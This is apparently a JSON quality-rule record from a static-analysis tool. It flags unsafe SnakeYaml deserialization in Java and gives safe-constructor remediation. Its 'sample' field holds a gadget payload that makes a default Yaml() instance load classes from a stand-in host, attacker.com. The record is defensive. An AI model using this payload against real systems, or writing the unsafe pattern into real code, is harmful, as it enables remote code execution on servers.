{
    "id": 1039056,
    "name": "Avoid insecure use of YAML deserilization (java)",
    "href": "AIP/quality-rules/1039056",
    "critical": true,
    "associatedValueName": "Number of violation occurrences",
    "description": "Avoid unsafe use of SnakeYaml for parsing YAML file in Java. SnakeYaml is a widely-used YAML parser written in Java.",
    "output": "Associated to each violation, the following information is provided:\n- The number of violation occurrences\n- Bookmarks for violation occurrences found in the source code",
    "rationale": "When user-controlled YAML streams are deserialized, then the attackers may gain access to execute arbitrary code on server and abuse logic of the application or may even lead to denial of service.\n\nThe YAML serialization libraries converts object graphs into YAML formatted data and it may include the metadata which is necessary to reconstruct objects back from YAML stream. If the classes of the objects which are to be reconstructed are specified by the attackers and if they force the application to run arbitrary setters with user-controlled data, in this scenario the attacker may gain access to execute arbitrary code during deserialization of YAML stream.",
    "reference": "https://cwe.mitre.org/data/definitions/502.html",
    "remediation": "Always make sure to use only a Yaml instance that is constructed either with a SafeConstructor:\n\nYaml yaml = new Yaml(new SafeConstructor());\n\nor an instance constructed with a Constructor specifying a specific class:\n\nYaml yaml = new Yaml(new Constructor(SafeClass.class));\n\nUsing the default constructor (without any parameters) will put your application and its users at risk.",
    "remediationSample": "Upon using SnakeYaml to parse YAML data, always make sure to use a Yaml instance that is constructed either with a SafeConstructor.\n\nYaml yaml = new Yaml(new SafeConstructor());\nor an instance constructed with a Constructor specifying a specific class:\n\nYaml yaml = new Yaml(new Constructor(SafeClass.class));\n\nUsing the default constructor (without any parameters) will put your application and its users at risk.",
    "sample": "SnakeYaml is a widely-used YAML parser written in Java. \nA lesser-known feature of SnakeYaml is its support for a special syntax that allows the constructor of any Java class to be called when parsing YAML data. \n\nFor example, consider the following piece of Java code that uses SnakeYaml to parse a string in the malicious variable:\n\nString malicious = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";\nYaml yaml = new Yaml(); // Unsafe instance of Yaml that allows any constructor to be called.\n\nObject obj = yaml.load(malicious); // Make request to http://attacker.com",
    "total": "Number of Java Methods",
    "alternativeName": "Always make sure to use a Yaml instance that is constructed either with a SafeConstructor.",
    "businessCriteria": [
        {
            "id": 20140522,
            "name": "Green Stuff",
            "href": "AIP/business-criteria/20140522"
        },
        {
            "id": 60016,
            "name": "Security",
            "href": "AIP/business-criteria/60016"
        }
    ],
    "technicalCriteria": [
        {
            "id": 66064,
            "name": "Secure Coding - Weak Security Features",
            "weight": 7,
            "critical": true
        }
    ],
    "technologies": [
        {
            "id": 140029,
            "name": "JEE",
            "href": "AIP/technologies/140029"
        }
    ],
    "qualityStandards": [
        {
            "standard": "CWE",
            "id": "CWE-502",
            "name": "Deserialization of Untrusted Data",
            "url": "https://cwe.mitre.org/data/definitions/502.html",
            "description": "The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid."
        },
        {
            "standard": "OWASP",
            "id": "A8-2017",
            "name": "Insecure Deserialization",
            "url": "https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization",
            "description": "Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks."
        }
    ],
    "parameters": [
        
    ],
    "thresholds": [
        98.0,
        99.0,
        99.5,
        99.99
    ]
}
